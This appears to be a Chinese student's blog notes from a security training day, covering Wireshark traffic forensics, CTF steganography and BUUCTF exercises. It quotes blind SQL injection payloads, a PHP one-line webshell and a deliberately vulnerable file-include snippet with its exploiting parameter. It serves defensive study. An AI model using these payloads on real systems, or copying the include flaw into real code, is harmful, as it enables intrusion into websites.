---
layout:     post
title:      "实训记录-周二"
subtitle:   "Day-2 安全分析与电子取证实战"
date:       2025-04-22 12:00:00
author:     "hangyangjun"
header-img: "img/training.png"
tags:
    - 笔记
    - 记录
    - 实训
    - 安全
    - 渗透测试
    - 流量分析
    - 隐写
---
# 上午-流量分析实战
## 1 SYN半链接攻击流量分析
打开[电线鲨鱼](https://www.wireshark.org/download.html)  
分析**流量包**（.pcap）

可见大量`SYN半连接`且**端口号**都不一样  
所以攻击者在扫描网站开放端口  
过滤条件:  
`ip.src == 192.168.177.145 and tcp.flags.syn == 1 and tcp.flags.ack == 1`

## 2 SQL注入攻击流量分析一
过滤http之后  
找到攻击者使用的查询语句↓    
`id=1'and if(length(database())=0,1,0)--+`  
`id=1'and if(ascii(substr(database(),7,1))>79,1,0) --+`  
采用布尔盲注
关键词：  
you are in ...

## 3 SQL注入攻击流量分析二
过滤：  
`http and (ip.src==192.168.177.1 or ip.dst== 192.168.177.145)`   
找到攻击者使用的查询语句↓    
`id=1' and if(length(database())=1,sleep(5),0) --+`   
`id=1' and if((select%20substring(database(),1,1))="a",sleep(5),1) --+` 

是更高级的**时间盲注**

## 4 Web入侵溯源一
发现一堆  
`http.response.code == 404`  
明显是扫后台呢  
是 `head` 请求，对网站进行目录爆破  

踪流->http 流,找到↓  
`admin_name=admin&admin_pwd=密码&submit=%B5%C7%C2%BC&act=do_login`  
中的`admin_pwd`字段  
攻击者对其进行了爆破  

然后发现代码
`@eval($_POST['x']);`

a	首先，黑客通过目录扫描，获取了后台管理地址。  
b	然后通过弱口令爆破，获取到了 admin 账户的密码，登录了后台。  
c	在对后台功能进行一番探索之后，找到了 admin/tpl_manage.php 文件可以通过目录遍历查看并修改任意文件的内容。由此通过修改 `index.php` 的内容，插入了 php 一句话木马。  
d	最后，黑客向 index 页面的**一句话木马**传递 `phpinfo()` 确认了一句话写入成功。  

## 5 Web入侵溯源二
1、使用 `Wireshark` 打开 webattack2.pcap 数据包。  
2、因为是对 web 攻击进行溯源分析 ，所以我们只需要关注 `http` 协议的数据包 。所以在显示过滤器中输入 http 过滤出 http 协议的数据包。  
搜索条件:  
`http and ((ip.src==192.168.177.1 and ip.dst==192.168.177.145) or (ip.src==192.168.177.145 and ip.dst==192.168.177.1))`  
3、通过对数据包的观察，前面部分的数据包为正常访问的数据包。  
4、从数据包编号为 1544 的包开始，开始出现 `head` 请求，以及大量的 404 响应，推测黑客正在对网站进行目录**爆破**。  
5、爆破完成后，流量中出现对 `/dede/login.php` 的访问记录。因为 dede 为 dedecms 的默认后台地址。此时黑客可能已经获取到了**后台**路径，且开始尝试登陆。  
6、查看 POST 数据包的内容，发现提交内容的用户名为 admin，密码为 123456 等弱口令，猜测黑客此时在进行弱口令测试。  
7、随后，出现了 `index.php` 的**访问记录**，观察前一个数据包的返回内容，其返回的内容为 JS 跳转，跳转到 index 页面，猜测此时黑客可能已经登录成功。  
8、之后黑客访问了 dede/ad_add.php 这个页面，`dedecms` 在 5.7 版本，这个页面存在 `getshell漏洞`，黑客应该是想利用此漏洞来进行 getshell。查看黑客此次 `POST` 提交的内容。发现了一句话木马。可以证实黑客是进行了 `getshell` 的操作。  
9、之后出现了大量的对 ad_js.php 页面的 POST 请求，查看请求的内容，为 php 代码。此时黑客可能已经成功 getshell，使用菜刀工具对 `webshell` 进行了连接。  

# 下午-流量分析与二进制ctf取证

## 密码追踪
Wireshark  
过滤`http`或`ftp`
使用数据流分析即可  
好像没啥好说的
## 数据包文件分析
流量分析找到密文
## 流量数据隐写分析
藏在图片里  
## 数据包中的线索
按长度排序  
找到上传的图片，里面藏了密码  
在流量文件里分离出zip加密文件，里面藏了flag

## 文件分析(隐写)
比较简单了  
主要就是flag藏在图片二进制文件里了  
然后就是png图片改大小以及base32编码  
最后就是爆破一个压缩包

# 晚上-写了一会buuctf的题

大部分都是简单题，基本上会基础操作都能想出来。  
### 难点
<br>

```php
highlight_file(__FILE__);

if(isset($_GET['file'])) {
    $str = $_GET['file'];

    include $_GET['file'];
}
```
- 有一道题是👆  
存在文件包含漏洞  
所以在网址后传参`%file=/flag`  
即可得到flag  

- 还有一个就是**zip伪加密**，遇到好几次了  
原理就是本身文件没有加密，但是二进制标志位被标记为有加密   
可以参考：  
[csdn_zip伪加密](https://blog.csdn.net/xiaozhaidada/article/details/124538768)(其实讲的有点不准确)  

- 以及 [RAR文件格式学习（了解）](https://blog.csdn.net/Claming_D/article/details/105899397)  

- 再有就是一个爱因斯坦的图片,找了半天没找到压缩包的密码藏哪了,最后一查发现密码藏在图片属性里的备注里

- and 有一个是图片隐写,需要下一个工具 [Stegsolve](https://github.com/zer00d4y/stegsolve) 进行破解  
Red plane 0、Grenn plane 0、Blue plane0通道发现图片的上方有东西 bit order 调整为LSB即可发现隐藏信息 

